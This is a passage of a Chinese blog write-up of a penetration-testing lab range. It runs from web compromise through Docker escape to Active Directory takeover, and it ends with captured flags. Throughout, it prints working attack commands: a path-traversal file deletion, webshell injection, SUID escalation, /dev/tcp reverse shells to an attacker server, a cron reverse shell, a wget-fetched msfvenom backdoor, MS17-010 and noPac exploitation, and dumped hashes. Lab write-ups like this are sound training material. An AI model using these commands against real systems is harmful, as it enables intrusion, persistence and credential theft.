index.php ---主页入口</span><br><span class="line">├── install ---安装文件</span><br><span class="line">├── module --主页模块文件</span><br><span class="line">├── public --公共资源</span><br><span class="line">├── template ---前端文件</span><br><span class="line">├── user.php --user模块入口</span><br></pre></td></tr></table></figure><p>那就一个一个看一下了，直到“install —安装文件”这个文件这里，出现一个提示</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-01-15_19-57-11.png"></p><p>好家伙，如果存在这个文件，再结合后台任意文件删除漏洞不就可以重装这个系统了？但是我没有决定那么做，这样动静比较大，我们先去看看那个盲注，看看能不能利用</p><p>其中一处sql注入位于改变商品状态处（上架商品、下架商品）</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-01-15_18-21-54.png"></p><p>完整数据包</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /admin/webadmin.php?mod=product<span class="built_in">&amp;</span>act=state<span class="built_in">&amp;</span>state=2<span class="built_in">&amp;</span>token=5eb7f4f216b7203866316713e34c055c HTTP/1.1</span><br><span class="line">Host: 103.117.136.19</span><br><span class="line">Content-Length: 859</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://103.117.136.19</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10<span class="built_in">_</span>15<span class="built_in">_</span>7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://103.117.136.19/admin/webadmin.php?mod=product</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Cookie: PHPSESSID=gkg87v4rkqoaarr3tnqsga89k5</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">product<span class="built_in">_</span>id<span class="comment">%5B%5D=1*&amp;product_order%5B69%5D=10000&amp;product_order%5B68%5D=10000&amp;product_order%5B67%5D=10000&amp;product_order%5B66%5D=10000&amp;product_order%5B65%5D=10000&amp;product_order%5B64%5D=10000&amp;product_order%5B63%5D=10000&amp;product_order%5B62%5D=10000&amp;product_order%5B61%5D=10000&amp;product_order%5B60%5D=10000&amp;product_order%5B59%5D=10000&amp;product_order%5B58%5D=10000&amp;product_order%5B57%5D=10000&amp;product_order%5B56%5D=10000&amp;product_order%5B55%5D=10000&amp;product_order%5B54%5D=10000&amp;product_order%5B53%5D=10000&amp;product_order%5B52%5D=10000&amp;product_order%5B51%5D=10000&amp;product_order%5B50%5D=10000&amp;product_order%5B49%5D=10000&amp;product_order%5B48%5D=10000&amp;product_order%5B47%5D=10000&amp;product_order%5B46%5D=10000&amp;product_order%5B45%5D=10000&amp;product_order%5B44%5D=10000&amp;product_order%5B43%5D=10000&amp;product_order%5B42%5D=10000&amp;product_order%5B41%5D=10000&amp;product_order%5B40%5D=10000</span></span><br></pre></td></tr></table></figure><p>sqlmap一把嗦</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-01-15_18-27-47.png"></p><p>DBA权限</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-01-15_18-30-27.png"></p><p>但是os shell失败了,file-write也写不进去，猜测可能是站裤分离或者是路径不对，那就只能重装这个管理系统了</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-01-15_18-39-39.png"></p><h2 id="重装漏洞Getshell"><a href="#重装漏洞Getshell" class="headerlink" title="重装漏洞Getshell"></a>重装漏洞Getshell</h2><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-01-15_18-39-39.png"></p><p>结合任意文件删除漏洞去把install.lock文件删除掉，再重装</p><p>任意文件删除存在于数据库备份这个功能点,点击删除进行抓包</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-01-16_00-58-36.png"></p><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-01-16_00-59-05.png"></p><p>修改dbname参数</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dbname=../../install/install.lock</span><br></pre></td></tr></table></figure><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-01-16_00-59-54.png"></p><p>修改完放包即可删除install.lock文件，然后进行重装</p><p>这里如果服务器地址填127.0.0.1的话，那么密码为空就可以安装了（可能本地mysql没密码的）数据表前缀这里进行闭合，这里的配置会被写进当前目录下的config.php文件，因此闭合之后，我们的一句话也被写到了config.php文件中</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-01-16_01-02-10.png"></p><p>蚁剑连接即可</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-01-16_01-47-25.png"></p><h1 id="二、内网横向"><a href="#二、内网横向" class="headerlink" title="二、内网横向"></a>二、内网横向</h1><h2 id="主机信息收集"><a href="#主机信息收集" class="headerlink" title="主机信息收集"></a>主机信息收集</h2><p>传个马上哥斯拉</p><p>www-data权限，ip:172.17.0.2</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-01-16_11-26-29.png"></p><p>使用哥斯拉自带的功能开启一个超级终端（交互式终端）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span> -a <span class="comment">#查看内核版本信息</span></span><br></pre></td></tr></table></figure><p>看这主机名有点像docker</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www-data@cbdf426e3ff6</span><br></pre></td></tr></table></figure><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-01-16_11-30-00.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -alh /.dockerenv <span class="comment">#确认是不是docker环境 原文链接：https://blog.csdn.net/ternence_hsu/article/details/100678307</span></span><br></pre></td></tr></table></figure><p>好，ztm是个docker</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-01-16_11-35-41.png"></p><h2 id="Docker-逃逸"><a href="#Docker-逃逸" class="headerlink" title="Docker 逃逸"></a>Docker 逃逸</h2><blockquote><p>当操作者执行docker run –privileged时，Docker将允许容器访问宿主机上的所有设备，同时修改AppArmor或SELinux的配置，使容器拥有与那些直接运行在宿主机上的进程几乎相同的访问权限。</p></blockquote><p>需要先将www-data提权至root，这台机器可以suid提权</p><p>查找具有SUID权限位文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -<span class="built_in">exec</span> <span class="built_in">ls</span> -ldb &#123;&#125; ;</span><br></pre></td></tr></table></figure><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-01-16_11-42-52.png"></p><p>SUID find提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -<span class="built_in">exec</span> /bin/bash -p \; -quit <span class="comment">#返回root权限的bash</span></span><br></pre></td></tr></table></figure><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-01-16_11-44-51.png"></p><p>哥斯拉这个终端反应太慢了，bash反弹到自己vps操作</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 9999 <span class="comment">#攻击机监听</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">&#x27;exec bash -i &amp;&gt;/dev/tcp/xxx.xx.x.146/9999 &lt;&amp;1&#x27;</span>  <span class="comment">#反弹shell</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -<span class="built_in">exec</span> /bin/bash -p \; -quit <span class="comment">#find提权</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span> <span class="comment">#返回一个交互式shell</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -<span class="built_in">exec</span> /bin/bash -p \; -quit <span class="comment">#find再提权一次</span></span><br></pre></td></tr></table></figure><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-01-16_12-15-35.png"></p><p>添加一个root权限的账户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt rootd 123456</span><br></pre></td></tr></table></figure><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-01-16_12-43-42.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;rootd:$1$rootd$.qpJYqSQfSiIXrtV53AZL1:0:0:root:/root:/bin/bash&#x27;</span> &gt;&gt; /etc/passwd</span><br></pre></td></tr></table></figure><p>检查是否写入</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-01-16_12-17-39.png"></p><p>切换用户，获得root权限,然后docker逃逸</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su rootd <span class="comment">#password:123456</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> <span class="built_in">test</span> <span class="comment">#创建一个目录test</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount /dev/sda1 /test <span class="comment">#挂载宿主机磁盘到新建目录test</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chroot</span> /test <span class="comment">#切换根目录</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd <span class="comment">#查看宿主机passwd文件</span></span><br></pre></td></tr></table></figure><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-01-16_12-22-33.png"></p><h2 id="计划任务反弹宿主机shell"><a href="#计划任务反弹宿主机shell" class="headerlink" title="计划任务反弹宿主机shell"></a>计划任务反弹宿主机shell</h2><p>在挂载的宿主机tmp目录下写一个反弹shell脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;#!/bin/bash&#x27;</span> &gt; sl.sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;/bin/bash -i &gt;&amp; bash -i &gt;&amp; /dev/tcp/xxx.xx.x.146/9998 0&gt;&amp;1&#x27;</span> &gt;&gt; sl.sh</span><br></pre></td></tr></table></figure><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-01-16_12-57-27.png"></p><p>写入计划任务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;$a*/1 *    * * *    root  bash /tmp/sl.sh &#x27;</span>  /etc/crontab</span><br></pre></td></tr></table></figure><p>获得宿主机shell</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-01-16_13-00-32.png"></p><p>msf设置监听，生成反向后门</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=xxx.xx.x.xxx LPORT=9997 -f elf &gt; test.elf</span><br></pre></td></tr></table></figure><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-01-16_13-11-47.png"></p><p>python开启一个简单的http服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure><p>受害机有wget工具，使用wget远程下载后门文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://159.xx.x.xxx:8000/test.elf</span><br></pre></td></tr></table></figure><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-01-16_13-14-10.png"></p><p>受害机执行恶意后门，msf获得反弹会话</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-01-16_13-14-50.png"></p><p>信息收集一波</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure><p>有一个段192.168.59.198&#x2F;24</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-01-16_15-59-19.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route</span><br></pre></td></tr></table></figure><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Kernel IP routing table</span><br><span class="line">Destination     Gateway         Genmask         Flags Metric Ref    Use Iface</span><br><span class="line">default         <span class="built_in">_</span>gateway        0.0.0.0         UG    100    0        0 ens33</span><br><span class="line">link-local      0.0.0.0         255.255.0.0     U     1000   0        0 ens33</span><br><span class="line">172.17.0.0      0.0.0.0         255.255.0.0     U     0      0        0 docker0</span><br><span class="line">192.168.59.0    0.0.0.0         255.255.255.0   U     100    0        0 ens33</span><br></pre></td></tr></table></figure><h2 id="Frp代理"><a href="#Frp代理" class="headerlink" title="Frp代理"></a>Frp代理</h2><p>frps</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind<span class="built_in">_</span>ip = xxx.xx.x.xx6</span><br><span class="line">bind<span class="built_in">_</span>port = 7777</span><br></pre></td></tr></table></figure><p>frpc</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server<span class="built_in">_</span>addr = xxx.xx.x.xx6</span><br><span class="line">server<span class="built_in">_</span>port = 7777</span><br><span class="line"></span><br><span class="line">[socks<span class="built_in">_</span>proxy]</span><br><span class="line">type = tcp</span><br><span class="line">remote<span class="built_in">_</span>port = 8888</span><br><span class="line">plugin = socks5</span><br></pre></td></tr></table></figure><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-01-16_15-55-46.png"></p><p>攻击机配置proxychains</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks5 159.75.1.146 8888</span><br></pre></td></tr></table></figure><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-01-16_16-05-15.png"></p><p>传个fscan扫一波内网</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fscan -h 192.168.59.0/24 -o res.txt</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">192.168.59.197:139 open</span><br><span class="line">192.168.59.144:139 open</span><br><span class="line">192.168.59.197:135 open</span><br><span class="line">192.168.59.144:135 open</span><br><span class="line">192.168.59.1:139 open</span><br><span class="line">192.168.59.1:135 open</span><br><span class="line">192.168.59.144:80 open</span><br><span class="line">192.168.59.198:80 open</span><br><span class="line">192.168.59.197:445 open</span><br><span class="line">192.168.59.1:10001 open</span><br><span class="line">192.168.59.144:445 open</span><br><span class="line">NetInfo:</span><br><span class="line">[*]192.168.59.197</span><br><span class="line">   [-&gt;]win7</span><br><span class="line">   [-&gt;]10.10.10.142</span><br><span class="line">   [-&gt;]192.168.59.197</span><br><span class="line">NetInfo:</span><br><span class="line">[*]192.168.59.1</span><br><span class="line">   [-&gt;]W10ZJ-2020PWKVD</span><br><span class="line">   [-&gt;]10.10.10.1</span><br><span class="line">   [-&gt;]192.168.64.1</span><br><span class="line">   [-&gt;]192.168.116.1</span><br><span class="line">   [-&gt;]192.168.59.1</span><br><span class="line">   [-&gt;]192.168.22.1</span><br><span class="line">   [-&gt;]61.100.100.1</span><br><span class="line">   [-&gt;]172.16.0.1</span><br><span class="line">   [-&gt;]10.10.2.1</span><br><span class="line">   [-&gt;]192.168.0.111</span><br><span class="line">NetInfo:</span><br><span class="line">[*]192.168.59.144</span><br><span class="line">   [-&gt;]win2003</span><br><span class="line">   [-&gt;]10.10.10.137</span><br><span class="line">   [-&gt;]192.168.59.144</span><br><span class="line">[*] 192.168.59.1         WORKGROUP\W10ZJ-2020PWKVD</span><br><span class="line">[*] WebTitle:http://192.168.59.144     code:200 len:1193   title:None</span><br><span class="line">[*] WebTitle:http://192.168.59.198     code:200 len:31     title:逍遥 B2C商城系统演示站</span><br><span class="line">[*] 192.168.59.197       __MSBROWSE__\WIN7              Windows 7 Ultimate 7601 Service Pack 1</span><br><span class="line">[*] 192.168.59.144       __MSBROWSE__\WIN2003           Windows Server 2003 3790 Service Pack 2</span><br><span class="line">[+] 192.168.59.197MS17-010(Windows 7 Ultimate 7601 Service Pack 1)</span><br><span class="line">[+] 192.168.59.144MS17-010(Windows Server 2003 3790 Service Pack 2)</span><br></pre></td></tr></table></figure><p>有两台windows存在ms17-010，这没啥好说的，直接掏出msf打就可以</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search ms17-010</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> lhost xxx.xxx.xxx.xxx</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> lport 8989</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> Proxies socks5:ip:port  <span class="comment">#给msf设置代理</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> ReverseAllowProxy <span class="literal">true</span>  <span class="comment">#允许反向代理</span></span><br></pre></td></tr></table></figure><p>192.168.59.197    MS17-010    (Windows 7 Ultimate 7601 Service Pack 1) 这台win7拿下</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-01-16_17-14-07.png"></p><h2 id="Cobalt-strike-上线"><a href="#Cobalt-strike-上线" class="headerlink" title="Cobalt strike 上线"></a>Cobalt strike 上线</h2><p>查询有无杀软</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /svc</span><br></pre></td></tr></table></figure><p>很好，啥也没有，那么cs powershell 直接上线就完事了</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-01-16_17-16-35.png"></p><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-01-16_17-15-45.png"></p><h2 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h2><p>发现存在一个nasa.gov的域</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-01-16_17-21-23.png"></p><p>DNS有两个地址</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.140</span><br><span class="line">10.10.10.141</span><br></pre></td></tr></table></figure><p>查询一下域控</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net dclist</span><br></pre></td></tr></table></figure><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-01-16_17-50-55.png"></p><p>使用cs自带扫描，扫描一下存活主机以及端口</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-01-16_17-51-35.png"></p><h2 id="凭据信息"><a href="#凭据信息" class="headerlink" title="凭据信息"></a>凭据信息</h2><p>抓到了一个域内普通账户明文密码</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nasa<span class="keyword">\test</span>:QWEasd!@<span class="params">#9</span>99</span><br></pre></td></tr></table></figure><p>dumphash得到三条hash</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">win7:1000:aad3b435b51404eeaad3b435b51404ee:f099c4a637f9b871487bbb03962f79b5:::</span><br></pre></td></tr></table></figure><p>win7是一个本地管理员账户,密码能撞出来</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">win7/admin555</span><br></pre></td></tr></table></figure><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-01-16_17-50-04.png"></p><h2 id="CVE-2021-42278-and-CVE-2021-42287-域提权上线"><a href="#CVE-2021-42278-and-CVE-2021-42287-域提权上线" class="headerlink" title="CVE-2021-42278 and CVE-2021-42287 域提权上线"></a>CVE-2021-42278 and CVE-2021-42287 域提权上线</h2><p>既然有一个普通域账户，可以试试最近的域提权漏洞 CVE-2021-42278 &amp; CVE-2021-42287</p><p>cs开一个socks4代理</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks4a 7640</span><br></pre></td></tr></table></figure><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-01-16_18-12-46.png"></p><p>攻击机配置prochains</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks xxx.xxx.xxx.xxx 7640</span><br></pre></td></tr></table></figure><p>代理</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-01-16_18-14-22.png"></p><p>使用脚本攻击即可</p><p>工具地址：<a href="https://github.com/Ridter/noPac">https://github.com/Ridter/noPac</a></p><h2 id="AD01"><a href="#AD01" class="headerlink" title="AD01"></a>AD01</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxy python noPac.py nasa.gov/test:<span class="string">&#x27;QWEasd!@#999&#x27;</span> -dc-ip 10.10.10.140 -dc-host AD01 -shell --impersonate administrator  <span class="comment">#getshell</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxy python noPac.py nasa.gov/test:<span class="string">&#x27;QWEasd!@#999&#x27;</span> -dc-ip 10.10.10.140 -dc-host AD01 --impersonate administrator -dump  <span class="comment">#dumphash</span></span><br></pre></td></tr></table></figure><p>得到域管hash</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:fbe5588a79e40d41d77a40569c7b3090:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure><p>Cobalt Strike pth即可</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-01-16_18-17-15.png"></p><h2 id="AD02"><a href="#AD02" class="headerlink" title="AD02"></a>AD02</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxy python noPac.py nasa.gov/test:<span class="string">&#x27;QWEasd!@#999&#x27;</span> -dc-ip 10.10.10.141 -dc-host AD02 -shell --impersonate administrator  <span class="comment">#getshell</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxy python noPac.py nasa.gov/test:<span class="string">&#x27;QWEasd!@#999&#x27;</span> -dc-ip 10.10.10.141 -dc-host AD02 --impersonate administrator -dump  <span class="comment">#dumphash</span></span><br></pre></td></tr></table></figure><p>Cobalt Strike pth即可（我这里用的AD01的域管hash）</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-01-16_18-17-15.png"></p><h2 id="Flags"><a href="#Flags" class="headerlink" title="Flags"></a>Flags</h2><h3 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu"></a>ubuntu</h3><p>moonsec_flag{182be0c5cdcd5072bb1864cdee4d3d6e}</p><h2 id="win7"><a href="#win7" class="headerlink" title="win7"></a>win7</h2><p>moon_flag{0b08bd98d279b88859b628cd8c061ae0} </p><h3 id="AD01-1"><a href="#AD01-1" class="headerlink" title="AD01"></a>AD01</h3><p>moonsec_flag{2181d94fba9a1d2de2b5f6fb75f8ab08}</p><h3 id="AD02-1"><a href="#AD02-1" class="headerlink" title="AD02"></a>AD02</h3><p>moonsec_flag{d3eb9a9233e52948740d7eb8c3062d14}</p><h2 id="收官"><a href="#收官" class="headerlink" title="收官"></a>收官</h2><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-01-16_15-56-29.png"></p><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-01-16_18-18-02.png"></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulntarget-b 靶场 WriteUp</title>
      <link href="/posts/2845400483/"/>
      <url>/posts/2845400483/</url>
      
